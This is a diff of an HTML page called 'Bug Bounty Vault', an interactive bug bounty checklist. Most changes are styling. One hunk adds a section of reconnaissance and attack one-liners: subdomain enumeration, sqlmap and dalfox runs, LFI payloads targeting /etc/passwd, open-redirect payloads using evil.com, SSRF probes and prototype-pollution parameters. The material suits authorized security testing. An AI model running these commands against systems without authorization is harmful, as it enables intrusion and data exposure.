@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title> Bug Bounty Vault · Hacker Checklist</title>
+    <title>🛡️ Bug Bounty Vault · Recon + Checklist</title>
     <!-- Google Fonts + Inconsolata -->
     <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -33,7 +33,6 @@
             transition: background 0.25s, color 0.25s;
             -webkit-font-smoothing: antialiased;
         }
-        /* Light mode base class (optional) */
         body.light-mode {
             background: var(--bg-light);
             color: var(--muted-dark);
@@ -60,15 +59,17 @@
         body.light-mode .check-item label {
             color: #1e293b;
         }
-        body.light-mode .stats-text, 
         body.light-mode .progress-track {
             background: #e0e7ef;
+        }
+        body.light-mode code {
+            background: #f1f5f9;
+            color: #d14;
         }
         .wrapper {
             display: flex;
             min-height: 100vh;
         }
-        /* SIDEBAR */
         .sidebar {
             width: var(--sidebar-w);
             background: #111;
@@ -158,15 +159,13 @@
         .theme-toggle button:hover {
             background: var(--accent-2);
         }
-        /* main content */
         .main {
             flex: 1;
             padding: 30px 35px;
-            max-width: 1200px;
+            max-width: 1300px;
             margin: 0 auto;
             width: 100%;
         }
-        /* top toolbar */
         .toolbar {
             background: rgba(0,0,0,0.2);
             border-radius: 20px;
@@ -252,7 +251,6 @@
             color: white;
             cursor: pointer;
         }
-        /* categories grid */
         .categories-grid {
             display: flex;
             flex-direction: column;
@@ -338,12 +336,21 @@
             height: 17px;
             accent-color: var(--accent);
             cursor: pointer;
+            flex-shrink: 0;
         }
         .check-item label {
             cursor: pointer;
             line-height: 1.4;
             flex: 1;
             word-break: break-word;
+            font-family: 'Inconsolata', monospace;
+        }
+        code {
+            background: #1a1f2e;
+            padding: 0.1rem 0.3rem;
+            border-radius: 8px;
+            font-size: 0.75rem;
+            color: #b0f0b0;
         }
         .no-match {
             text-align: center;
@@ -387,12 +394,12 @@
 <body>
 <div class="wrapper">
     <aside class="sidebar" id="sidebar">
-        <img class="sidebar-img" src="https://i.ibb.co/N5jzt9G/Screenshot-2025-07-06-at-22-55-12-Instagram.png" alt="hacker avatar">
-        <h1> BUG BOUNTY VAULT</h1>
-        <p>OAuth · 2FA · ATO · IDOR · Session</p>
+        <img class="sidebar-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23111' stroke='%2300ff88' stroke-width='2'/%3E%3Cpath fill='%2300ff88' d='M35 40 L65 40 L65 60 L35 60 Z M42 48 L58 48 L58 54 L42 54Z'/%3E%3Ccircle cx='50' cy='70' r='6' fill='%2300d4ff'/%3E%3C/svg%3E" alt="hacker avatar">
+        <h1>⚡ BUG BOUNTY VAULT</h1>
+        <p>Recon · OAuth · 2FA · ATO · IDOR</p>
         <div class="nav" id="dynamicNav"></div>
         <div class="theme-toggle">
-            <button id="themeToggleBtn" aria-label="Dark/Light mode"> THEME SWITCH</button>
+            <button id="themeToggleBtn" aria-label="Dark/Light mode">🌓 THEME SWITCH</button>
         </div>
     </aside>
 
@@ -403,24 +410,24 @@
                 <div class="stats-text" id="statsCounter">— / —</div>
             </div>
             <div class="action-group">
-                <button class="btn btn-primary" id="expandAllBtn"> EXPAND ALL</button>
-                <button class="btn" id="collapseAllBtn"> COLLAPSE ALL</button>
-                <button class="btn" id="resetChecksBtn">RESET PROGRESS</button>
+                <button class="btn btn-primary" id="expandAllBtn">📂 EXPAND ALL</button>
+                <button class="btn" id="collapseAllBtn">📁 COLLAPSE ALL</button>
+                <button class="btn" id="resetChecksBtn">⟳ RESET PROGRESS</button>
             </div>
             <div class="search-box">
-                <input type="text" id="searchInput" placeholder=" grep for techniques: PKCE, redirect_uri, state parameter, OTP...">
+                <input type="text" id="searchInput" placeholder="🔎 grep for techniques: subfinder, nuclei, dalfox, sqli, ssrf...">
                 <button id="clearSearchBtn">CLEAR</button>
             </div>
         </div>
 
         <div id="checklistRoot" class="categories-grid"></div>
-        <footer> checkboxes save locally · real-world bug bounty techniques · v1.0</footer>
+        <footer>✔️ checkboxes save locally · real-world bug bounty & recon automation · v2.0</footer>
     </main>
     <button id="scrollTopBtn" title="back to top">↑ TOP</button>
 </div>
 
 <script>
-    // ======================== FULL RAW CHECKLIST (preserved from original) ========================
+    // ======================== FULL RAW CHECKLIST (original vulns + recon commands) ========================
     const RAW_CHECKLIST = `# Bug Bounty Vulnerability Checklist
 
 ## 1. OAuth Vulnerabilities
@@ -746,9 +753,69 @@
 - [ ] ATO via OAuth email field manipulation
 - [ ] Support ticket email injection
 - [ ] %20 email exists bypass
+
+## 12. 🕵️ Reconnaissance & Automation Commands
+
+### Subdomain Discovery
+- [ ] subfinder -d example.com -o subfinder.txt
+- [ ] assetfinder --subs-only example.com > assetfinder.txt
+- [ ] curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | tr '\\n' '\\n' | sed 's/ /\\n/g' | sort -u | grep -v '^$' > crtsh.txt
+- [ ] dnsx -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -d example.com -silent -o dnsx.txt
+- [ ] cat subfinder.txt assetfinder.txt crtsh.txt dnsx.txt > all_subs.txt && sort -u all_subs.txt > unique_subs.txt
+- [ ] httpx -l unique_subs.txt -o live_subs.txt
+
+### Subdomain Takeover
+- [ ] subzy run --targets live_subs.txt
+- [ ] nuclei -l live_subs.txt -t takeovers/
+
+### URL & JS Discovery
+- [ ] katana -list live_subs.txt -silent -kf all -jc > urls.txt
+- [ ] cat live_subs.txt | waybackurls >> urls.txt
+- [ ] cat live_subs.txt | gau --subs >> urls.txt
+- [ ] sort -u urls.txt | uro > unique_urls.txt
+- [ ] httpx -l unique_urls.txt -o live_urls.txt
+- [ ] awk '/\\.js(\\?|$)/ {print}' live_urls.txt > js_links.txt
+- [ ] cat js_links.txt | mantra
+- [ ] cat js_links.txt | jsecret
+
+### Parameter Discovery & Reflection
+- [ ] cat live_urls.txt | uro | sort -u > cleaned_urls.txt
+- [ ] cat cleaned_urls.txt | grep "=" > params_urls.txt
+- [ ] cat params_urls.txt | uro | sort -u > clean_params.txt
+- [ ] cat params_urls.txt | qsreplace "REFLECT123" | httpx -silent -mr "REFLECT123" > reflected.txt
+- [ ] for vuln in xss sqli ssrf redirect lfi; do gf "$vuln" < params_urls.txt | qsreplace "FUZZ" | sort -u > "${vuln}.txt"; done
+
+### SQLi Testing
+- [ ] cat sqli.txt | while read url; do echo "$url" | qsreplace "test123" | httpx -silent -mc 200 -mr "test123"; done > dynamic.txt
+- [ ] sqlmap -m sqli.txt --batch --level 3 --risk 2
+
+### XSS Automation
+- [ ] cat xss.txt | dalfox pipe
+
+### LFI / Local File Inclusion
+- [ ] cat lfi.txt | while read url; do for payload in "../../../../../../etc/passwd" "../../../../../../etc/passwd%00" "php://filter/convert.base64-encode/resource=index.php"; do echo "$url" | qsreplace "$payload"; done; done | httpx -silent -mr "root:"
+
+### Open Redirect
+- [ ] cat redirect.txt | qsreplace "///evil.com" | httpx -silent -location -status-code -mr "evil.com" -mc 301,302,307,308
+- [ ] cat redirect.txt | qsreplace "//evil.com" | httpx -silent -location -status-code -mr "evil.com" -mc 301,302,307,308
+- [ ] cat redirect.txt | qsreplace "//evil.com/%2f.." | httpx -silent -location -status-code -mr "evil.com" -mc 301,302,307,308
+- [ ] cat redirect.txt | qsreplace "@evil.com" | httpx -silent -location -status-code -mr "evil.com" -mc 301,302,307,308
+
+### Advanced Open Redirect Fuzzing
+- [ ] cat cleaned_urls.txt | grep "=" | qsreplace -a FUZZ > fuzz_urls.txt
+- [ ] for payload in "https://evil.com" "//evil.com" "///evil.com" "https:%2f%2fevil.com" "%2f%2fevil.com" "%252f%252fevil.com" "https://example.com@evil.com" "//example.com@evil.com" "https:\\\\evil.com" "\\\\\\\\evil.com" "/%2fevil.com"; do cat fuzz_urls.txt | sed "s|FUZZ|$payload|g"; done > openredirect_payloads.txt
+- [ ] cat openredirect_payloads.txt | httpx -silent -location -mc 301,302,307,308 | grep "evil.com"
+
+### SSRF (Server-Side Request Forgery)
+- [ ] cat ssrf.txt | qsreplace "http://127.0.0.1" | httpx -silent -status-code
+
+### Prototype Pollution
+- [ ] cat cleaned_urls.txt | qsreplace "proto[test]=1" | httpx -silent
+- [ ] cat cleaned_urls.txt | qsreplace "constructor.prototype.test=1" | httpx -silent
+- [ ] cat cleaned_urls.txt | while read url; do for payload in "proto[admin]=true" "proto[isAdmin]=true" "constructor.prototype.admin=true"; do echo "$url" | qsreplace "$payload"; done; done | httpx -silent
 `;
 
-    // ---- Parser ----
+    // Parser (identical to before)
     function parseChecklist(raw) {
         const lines = raw.split(/\r?\n/);
         const categories = [];
@@ -781,7 +848,7 @@
 
     function loadState() {
         try {
-            const raw = localStorage.getItem('bounty_hacker_checks');
+            const raw = localStorage.getItem('bounty_hacker_checks_v2');
             if (raw) {
                 const obj = JSON.parse(raw);
                 for (let [k, v] of Object.entries(obj)) checksState.set(k, v);
@@ -791,7 +858,7 @@
     function saveState() {
         const obj = {};
         for (let [k, v] of checksState.entries()) obj[k] = v;
-        localStorage.setItem('bounty_hacker_checks', JSON.stringify(obj));
+        localStorage.setItem('bounty_hacker_checks_v2', JSON.stringify(obj));
     }
 
     let searchTerm = "";
@@ -869,7 +936,7 @@
             });
             root.appendChild(card);
         }
-        if (!anyVisible && searchTerm) root.innerHTML = '<div class="no-match"> No matching techniques — try different keyword</div>';
+        if (!anyVisible && searchTerm) root.innerHTML = '<div class="no-match">🔎 No matching commands or vulnerabilities — try different keyword</div>';
         updateProgress();
     }
 
@@ -877,14 +944,15 @@
     function collapseAll() { document.querySelectorAll('.subcategories').forEach(el => el.classList.remove('open')); document.querySelectorAll('.toggle-icon').forEach(ic => ic.innerHTML = '▼');}
     function resetAll() { checksState.clear(); saveState(); renderChecklist(); }
 
-    // dynamic nav
     function generateNav() {
         const navDiv = document.getElementById('dynamicNav');
         navDiv.innerHTML = '';
         categories.forEach((cat, idx) => {
             const a = document.createElement('a');
             a.href = `#cat-${idx}`;
-            a.textContent = `⛁ ${cat.title}`;
+            let icon = "📌";
+            if (cat.title.includes("Recon")) icon = "🕵️";
+            a.textContent = `${icon} ${cat.title.substring(0, 28)}`;
             a.addEventListener('click', (e) => {
                 e.preventDefault();
                 const target = document.getElementById(`cat-${idx}`);
@@ -894,7 +962,6 @@
         });
     }
 
-    // theme toggle
     function initTheme() {
         const btn = document.getElementById('themeToggleBtn');
         const body = document.body;
@@ -905,7 +972,6 @@
         });
     }
 
-    // scroll top
     const scrollBtn = document.getElementById('scrollTopBtn');
     window.addEventListener('scroll', () => { scrollBtn.style.display = window.scrollY > 300 ? 'flex' : 'none'; });
     scrollBtn.onclick = () => window.scrollTo({ top: 0, behavior: 'smooth' });
